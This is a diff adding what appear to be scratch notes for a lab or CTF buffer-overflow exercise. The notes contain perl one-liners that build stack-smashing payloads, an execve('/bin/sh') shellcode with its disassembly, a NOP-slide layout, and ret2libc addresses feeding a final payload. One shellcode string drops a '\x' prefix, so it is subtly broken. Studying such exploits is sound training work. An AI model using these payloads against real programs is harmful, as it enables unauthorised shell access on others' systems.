@@ -1,0 +1,46 @@
+0xFF FF D0 8C   # Stack
+
+perl -e 'print "A"x76 . "\x8C\xD0\xFF\xFF"' > test_payload
+
+
+
+0x08 04 85 3F      # Main
+
+perl -e 'print "A"x76 . "\x3F\x85\x04\x08"' > test_payload
+
+Shellcode :
+
+   0:	31 c0                	xor    eax,eax
+   2:	50                   	push   eax
+   3:	68 2f 2f 73 68       	push   0x68732f2f
+   8:	68 2f 62 69 6e       	push   0x6e69622f
+   d:	89 e3                	mov    ebx,esp
+   f:	50                   	push   eax
+  10:	89 e2                	mov    edx,esp
+  12:	53                   	push   ebx
+  13:	89 e1                	mov    ecx,esp
+  15:	b0 0b                	mov    al,0xb
+  17:	cd 80                	int    0x80
+
+"31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+address: 0xff ff d0 a0
+
+[40 nop slide][25 Shellcode][A * 11][address in nop slide]
+
+perl -e 'print "\x90"x40 .
+    "31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" .
+    "A"x10 .
+    "\x90\xD0\xFF\xFF"' > test_payload
+
+
+
+ret:      0x0804854b
+/bin/sh:  0xffffd82a
+system:   0xf7deca60
+
+final ret:    0x0804854b
+final bin/sh: 0xbffff927
+final system: 0xb7e6b060
+
+perl -e 'print "\x27\xf9\xff\xbf"x20 . "\x4b\x85\x04\x08\x60\xb0\xe6\xb7"' > /tmp/payload
